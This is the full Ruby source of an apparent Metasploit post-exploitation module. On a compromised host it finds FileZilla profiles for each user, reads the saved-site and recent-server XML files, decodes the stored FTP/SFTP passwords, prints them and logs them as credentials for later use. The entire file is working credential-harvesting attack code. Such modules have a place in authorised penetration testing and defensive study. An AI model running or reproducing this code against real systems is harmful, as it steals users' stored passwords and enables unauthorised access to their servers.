##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rexml/document'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather FileZilla FTP Client Credential Collection',
      'Description'    => %q{ This module will collect credentials from the FileZilla FTP client if it is installed. },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'bannedit', # post port, added support for shell sessions
          'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
        ],
      'Platform'       => %w{ bsd linux osx unix win },
      'SessionTypes'   => ['shell', 'meterpreter' ]
    ))
  end

  def run
    paths = []
    case session.platform
    when 'unix', 'linux', 'bsd'
      @platform = :unix
      paths = enum_users_unix
    when 'osx'
      @platform = :osx
      paths = enum_users_unix
    when 'windows'
      @platform = :windows
      profiles = grab_user_profiles()
      profiles.each do |user|
        next if user['AppData'] == nil
        fzdir = check_filezilla(user['AppData'])
        paths << fzdir if fzdir
      end

    else
      print_error "Unsupported platform #{session.platform}"
      return
    end
    if paths.nil? or paths.empty?
      print_status("No users found with a FileZilla directory")
      return
    end

    get_filezilla_creds(paths)
  end

  def enum_users_unix
    if @platform == :osx
      home = "/Users/"
    else
      home = "/home/"
    end

    if got_root?
      userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
      userdirs << "/root\n"
    else
      userdirs = session.shell_command("ls #{home}#{whoami}/.filezilla")
      if userdirs =~ /No such file/i
        return
      else
        print_status("Found FileZilla Client profile for: #{whoami}")
        return ["#{home}#{whoami}/.filezilla"]
      end
    end

    paths = Array.new
    userdirs.each_line do |dir|
      dir.chomp!
      next if dir == "." || dir == ".."

      dir = "#{home}#{dir}" if dir !~ /root/
      print_status("Checking for FileZilla Client profile in: #{dir}")

      stat = session.shell_command("ls #{dir}/.filezilla/sitemanager.xml")
      next if stat =~ /No such file/i
      paths << "#{dir}/.filezilla"
    end
    return paths
  end


  def check_filezilla(filezilladir)
    print_status("Checking for Filezilla directory in: #{filezilladir}")
    session.fs.dir.foreach(filezilladir) do |dir|
      if dir =~ /FileZilla/
        print_status("Found #{filezilladir}\\#{dir}")
        return "#{filezilladir}\\#{dir}"
      end
    end
    return nil
  end


  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      post_reference_name: self.refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: :password,
      username: opts[:username]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def is_base64?(str)
    str.match(/^([A-Za-z0-9+\/]{4})*([A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)$/) ? true : false
  end


  def try_decode_password(str)
    is_base64?(str) ? Rex::Text.decode_base64(str) : str
  end


  def get_filezilla_creds(paths)

    sitedata = ""
    recentdata = ""
    creds = []

    paths.each do |path|
      print_status("Reading sitemanager.xml and recentservers.xml files from #{path}")
      if session.type == "shell"
        type = :shell
        sites = session.shell_command("cat #{path}/sitemanager.xml")
        recents = session.shell_command("cat #{path}/recentservers.xml")
        print_status("recents: #{recents}")
        creds = [parse_accounts(sites)]
        creds << parse_accounts(recents) unless recents =~ /No such file/i
      else
        type = :meterp
        sitexml = "#{path}\\sitemanager.xml"
        present = session.fs.file.stat(sitexml) rescue nil
        if present
          sites = session.fs.file.new(sitexml, "rb")
          until sites.eof?
            sitedata << sites.read
          end
          sites.close
          print_status("Parsing sitemanager.xml")
          creds = [parse_accounts(sitedata)]
        else
          print_status("No saved connections where found")
        end

        recent_file = "#{path}\\recentservers.xml"
        recent_present = session.fs.file.stat(recent_file) rescue nil
        if recent_present
          recents = session.fs.file.new(recent_file, "rb")
          until recents.eof?
            recentdata << recents.read
          end
          recents.close
          print_status("Parsing recentservers.xml")
          creds << parse_accounts(recentdata)
        else
          print_status("No recent connections where found.")
        end
      end
      creds.each do |cred|
        cred.each do |loot|
          if session.db_record
            source_id = session.db_record.id
          else
            source_id = nil
          end

          report_cred(
            ip: loot['host'],
            port: loot['port'],
            service_name: 'ftp',
            username: loot['user'],
            password: try_decode_password(loot['password'])
          )
        end
      end
    end

  end

  def parse_accounts(data)
    creds = []

    doc = REXML::Document.new(data).root rescue nil
    return [] if doc.nil?

    doc.elements.to_a("//Server").each do |sub|
      account = {}
      account['host'] = sub.elements['Host'].text rescue "<unknown>"
      account['port'] = sub.elements['Port'].text rescue "<unknown>"

      case sub.elements['Logontype'].text
      when "0"
        account['logontype'] = "Anonymous"
      when /1|4/
        account['user'] = sub.elements['User'].text rescue "<unknown>"
        account['password'] = sub.elements['Pass'].text rescue "<unknown>"
      when /2|3/
        account['user'] = sub.elements['User'].text rescue "<unknown>"
        account['password'] = "<blank>"
      end

      if account['user'].nil?
        account['user'] = "<blank>"
      end
      if account['password'].nil?
        account['password'] = "<blank>"
      end

      case sub.elements['Protocol'].text
      when "0"
        account['protocol'] = "FTP"
      when "1"
        account['protocol'] = "SSH"
      when "3"
        account['protocol'] = "FTPS"
      when "4"
        account['protocol'] = "FTPES"
      end
      creds << account

      print_status("    Collected the following credentials:")
      print_status("    Server: %s:%s" % [account['host'], account['port']])
      print_status("    Protocol: %s" % account['protocol'])
      print_status("    Username: %s" % account['user'])
      print_status("    Password: %s" % try_decode_password(account['password']))
      print_line("")
    end
    return creds
  end

  def got_root?
    case @platform
    when :windows
      if session.sys.config.getuid =~ /SYSTEM/
        return true
      else
        return false
      end
    else # unix, bsd, linux, osx
      ret = whoami
      if ret =~ /root/
        return true
      else
        return false
      end
    end
  end

  def whoami
    if @platform == :windows
      session.sys.config.getenv('USERNAME')
    else
      session.shell_command("whoami").chomp
    end
  end
end
